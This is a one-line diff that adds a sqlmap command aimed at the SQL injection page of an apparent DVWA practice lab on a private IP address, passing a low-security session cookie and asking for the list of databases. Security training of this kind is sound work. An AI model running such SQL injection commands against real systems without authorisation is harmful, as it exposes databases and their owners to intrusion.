@@ -1,0 +1,1 @@
+sqlmap -u "http://192.168.11.129/dvwa/vulnerabilities/sqli/?id=1" --cookie="security=low; PHPSESSID=abc123" --dbs
